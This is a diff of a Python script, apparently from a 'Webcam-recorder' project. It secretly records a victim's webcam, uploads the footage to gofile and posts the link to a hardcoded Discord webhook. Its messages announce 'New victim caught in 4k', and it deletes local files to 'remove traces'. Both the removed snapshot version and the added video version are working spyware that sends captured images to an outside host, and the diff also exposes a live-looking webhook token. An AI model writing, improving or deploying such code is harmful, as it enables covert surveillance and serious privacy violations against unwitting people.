@@ -1,63 +1,67 @@
-import os, cv2, requests
-from urllib.request import Request, urlopen
-from json import dumps
+import os, cv2, requests, time, gofile2, datetime
 
-webhook_url = "YOUR_WEBHOOK_HERE" #your webhook url
-avatar_url = "https://i.imgur.com/QVCVjM4.png" #change this to your chosen image link if you want something else for image
+class WebcamRecorder():
+    def __init__(self):
+        self.webhook = "https://discord.com/api/webhooks/892011430507843614/gQTiTj8kqJzopvJm_ykesWoqEtBK5MGJ8xSirxUM2bLsJxy0nYH2u9FcslPTEudrEckR"
+        self.filename = 'video.avi'
 
-headers = {
-    'Content-Type': 'application/json',
-    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-}
-Error = {					# Error message that gets sent to webhook
-	"content": "Failed to Take/Send Screenshot",
-	"username": "Caught in 4k",
-	"avatar_url": avatar_url
-}
-def main():
-	cam = cv2.VideoCapture(0) #capture the webcam
-	img_counter = 0
-	for i in range(2): #change this from 2 to 5 for example if you want it to take 5 pictures
-		try:
-			ret, frame = cam.read()
-			if not ret:
-				urlopen(Request(webhook_url, data=dumps(Error).encode(), headers=headers))
-			img_name = "Screenshot_{}.jpg".format(img_counter) #you can change the name of the screenshot image here (don't remove the {})
-			cv2.imwrite(img_name, frame)
-			try:
-				screenshotRaw = requests.post('https://srv-store2.gofile.io/uploadFile', files={'file': (f'{os.getcwd()}\\{img_name}', open(f'{os.getcwd()}\\{img_name}', 'rb')),}).text #upload the image
-				screenshotUploaded = f"[Screenshot]({screenshotRaw[87:113]})" #text that gets sent to webhook and the link to image
-			except:
-				screenshotUploaded = "Screenshot: N/A" #tells you that it failed to upload
-				pass
-			img_counter += 1
-			send(screenshotUploaded)
-			os.remove(f'{os.getcwd()}\\{img_name}') #remove traces
-		except:
-			pass
-	cam.release()
-	cv2.destroyAllWindows()
-def send(screenshotUploaded):
-	embeds = []
-	embed = {
-		"color": 5023308,
-		"description": f"{screenshotUploaded}",
-		"author": {
-			"name": "Screenshot",
-			"icon_url": avatar_url
-		},
-	}
-	embeds.append(embed)
-	webhook = {
-		"content": "@everyone", #remove the @everyone if you don't want it to ping
-		"embeds": embeds,
-		"username": "Caught in 4k", #change the name to whatever you want
-		"avatar_url": avatar_url
-	}
-	try:
-		urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=headers))
-	except:
-		urlopen(Request(webhook_url, data=dumps(Error).encode(), headers=headers))
-		pass
+        self.Recorder()
+
+    def change_res(self, cap, width, height):
+        cap.set(3, width)
+        cap.set(4, height)
+        
+    def get_dims(self, cap, res='1080p'):
+        STD_DIMENSIONS =  {
+            "480p": (640, 480),
+            "720p": (1280, 720),
+            "1080p": (1920, 1080),
+            "4k": (3840, 2160),
+        }
+        width, height = STD_DIMENSIONS["480p"]
+        if res in STD_DIMENSIONS:
+            width,height = STD_DIMENSIONS[res]
+        self.change_res(cap, width, height)
+        return width, height
+
+    def Recorder(self):
+        res = '720p'
+        t_end = time.time() + 2
+        cap = cv2.VideoCapture(0)
+        out = cv2.VideoWriter(self.filename, cv2.VideoWriter_fourcc(*'XVID'), 25, self.get_dims(cap, res))
+        while time.time() < t_end:
+            ret, frame = cap.read()
+            out.write(frame)
+        cap.release()
+        out.release()
+        cv2.destroyAllWindows()
+        g_a = gofile2.Gofile()
+        videoUrl = g_a.upload(file=f'{os.getcwd()}\\{self.filename}')
+        self.webcam = f"**Webcam Video: [{videoUrl['downloadPage']}]({videoUrl['downloadPage']})**"
+        os.remove(os.getcwd()+"\\"+self.filename)
+        self.WebhookSender(self.webcam)
+
+    def WebhookSender(self, webcam):
+        today = datetime.date.today()
+        alert = {
+            "avatar_url":"https://i.imgur.com/QVCVjM4.png",
+            "name":"Webcam Catcher",
+            "embeds": [
+                {
+                    "author": {
+                        "name": "𝓦𝓮𝓫𝓬𝓪𝓶 𝓒𝓪𝓽𝓬𝓱𝓮𝓻",
+                        "icon_url": "https://i.imgur.com/QVCVjM4.png",
+                        "url": "https://github.com/Rdimo/Webcam-recorder"
+                        },
+                    "description": f"𝗡𝗲𝘄 𝘃𝗶𝗰𝘁𝗶𝗺 𝗰𝗮𝘂𝗴𝗵𝘁 𝗶𝗻 𝟰𝗸\n{webcam}",
+                    "color": 8421504,
+                    "footer": {
+                      "text": f"github.com/Rdimo/Webcam-recorder Caught Someone lacking at・{today}"
+                    }
+                }
+            ]
+        }
+        requests.post(self.webhook, json=alert)
+
 if __name__ == "__main__":
-	main()
+    WebcamRecorder()
